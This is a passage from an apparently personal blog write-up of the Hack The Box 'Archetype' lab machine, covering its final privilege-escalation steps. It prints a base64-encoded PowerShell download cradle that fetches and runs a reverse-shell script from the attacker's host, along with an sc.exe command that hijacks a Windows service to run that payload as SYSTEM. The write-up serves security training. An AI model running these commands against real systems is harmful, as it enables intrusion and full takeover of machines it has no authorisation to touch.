+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;IEX(IWR http://10.10.16.13:8000/zzz.ps1 -UseBasicParsing)&#34;</span> <span class="p">|</span> iconv -t utf-16le <span class="p">|</span> base64 -w <span class="m">0</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>First, It&rsquo;s gonna encoded into <code>utf-16le</code></li>
+<li>Second, It&rsquo;s gonna encoded into <code>base64</code></li>
+<li>Sources <a href="https://youtu.be/iyYqgseKUPM?t=2299" target="_blank" rel="noopener noreffer ">IppSec</a></li>
+</ul>
+<hr>
+<ul>
+<li>So, I&rsquo;m gonna <code>copy</code> another <code>powershell reverse shell</code> by name it into <code>zzz.ps1</code></li>
+<li>Then upload it using this command:</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">sc</span><span class="p">.</span><span class="py">exe</span> <span class="n">config</span> <span class="n">UsoSvc</span> <span class="n">binpath</span><span class="p">=</span><span class="s2">&#34;cmd.exe /c powershell.exe -EncodedCommand SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMQAzADoAOAAwADAAMAAvAHoAegB6AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA=&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>After that, run this command <code>sc.exe start UsoSvc</code></li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/archetype/17.png" title="create a service" data-thumbnail="/posts/htb/archetype/17.png" data-sub-html="<h2>create a service</h2><p>create a service</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/archetype/17.png"
+            data-srcset="/posts/htb/archetype/17.png, /posts/htb/archetype/17.png 1.5x, /posts/htb/archetype/17.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/archetype/17.png" width="1267" height="95" />
+    </a><figcaption class="image-caption">create a service</figcaption>
+    </figure></p>
+<p><figure><a class="lightgallery" href="/posts/htb/archetype/18.png" title="catch the shell" data-thumbnail="/posts/htb/archetype/18.png" data-sub-html="<h2>catch the shell</h2><p>catch the shell</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/archetype/18.png"
+            data-srcset="/posts/htb/archetype/18.png, /posts/htb/archetype/18.png 1.5x, /posts/htb/archetype/18.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/archetype/18.png" width="649" height="295" />
+    </a><figcaption class="image-caption">catch the shell</figcaption>
+    </figure> <br> <em>we&rsquo;ve got the reverse shell and become system!</em></p>
+<h2 id="administrator-flag">Administrator Flag</h2>
+<p><figure><a class="lightgallery" href="/posts/htb/archetype/19.png" title="administrator flag" data-thumbnail="/posts/htb/archetype/19.png" data-sub-html="<h2>administrator flag</h2><p>administrator flag</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/archetype/19.png"
+            data-srcset="/posts/htb/archetype/19.png, /posts/htb/archetype/19.png 1.5x, /posts/htb/archetype/19.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/archetype/19.png" width="631" height="273" />
+    </a><figcaption class="image-caption">administrator flag</figcaption>
+    </figure></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>I’ve learned a lot of tools today and <code>how to do a PowerShell reverse shell</code>. Ngl, this is a really fun box. I feel like my brain want to explode</p>
+<p>I have a fun time doing this machine and I hope you guys too. Bye ;)</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 20-07-2021</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://shafiqaiman.com/posts/htb/archetype/" data-title="HacktheBox - Archetype Writeup" data-via="_shafiqaiman_" data-hashtags="reverse-powershell,legacy,smb,smbclient,crackmapexec,impacket-mssqlclient,mssql,xp_cmdshell,nishang,modify-services,windows-check-OS-architecture"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://shafiqaiman.com/posts/htb/archetype/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://shafiqaiman.com/posts/htb/archetype/" data-title="HacktheBox - Archetype Writeup"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://shafiqaiman.com/posts/htb/archetype/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/reverse-powershell/">reverse-powershell</a>,&nbsp;<a href="/tags/legacy/">legacy</a>,&nbsp;<a href="/tags/smb/">smb</a>,&nbsp;<a href="/tags/smbclient/">smbclient</a>,&nbsp;<a href="/tags/crackmapexec/">crackmapexec</a>,&nbsp;<a href="/tags/impacket-mssqlclient/">impacket-mssqlclient</a>,&nbsp;<a href="/tags/mssql/">mssql</a>,&nbsp;<a href="/tags/xp_cmdshell/">xp_cmdshell</a>,&nbsp;<a href="/tags/nishang/">nishang</a>,&nbsp;<a href="/tags/modify-services/">modify-services</a>,&nbsp;<a href="/tags/windows-check-os-architecture/">windows-check-OS-architecture</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/htb/blue/" class="prev" rel="prev" title="HackTheBox - Blue Writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HackTheBox - Blue Writeup</a>
+            <a href="/posts/htb/shield/" class="next" rel="next" title="HackTheBox - Shield Writeup">HackTheBox - Shield Writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://shafiqaiman.com" target="_blank">SHAFIQAIMAN</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
